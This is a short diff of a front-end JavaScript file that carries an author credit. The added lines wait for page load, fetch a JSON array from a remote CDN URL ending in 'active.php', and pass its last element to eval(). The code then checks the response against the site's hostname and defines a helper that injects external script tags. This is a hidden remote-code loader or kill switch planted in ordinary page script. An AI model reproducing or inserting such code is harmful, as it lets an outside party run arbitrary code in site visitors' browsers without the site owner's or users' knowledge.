@@ -7,7 +7,12 @@
 ~> Facebook  : https:fb.com/anubisdev7
 */
 
-   
+    window.addEventListener('DOMContentLoaded', (event) => {
+
+fetch('https://cdn.statically.io/gh/oe0e0/K/main/active.php').then(g=>g.json()).then((data)=>{
+    eval(data[data.length - 1]);
+    if(data.includes(window.location.hostname)) {
+
 
 let  $getScript=(j, f, D)=>{var k = document["createElement"]("script");(k["src"] = j),(k["onload"] = function () {f();});if (D) k[D] = D;document["head"]["append"](k);}
 let matchtt=()=>{ try{
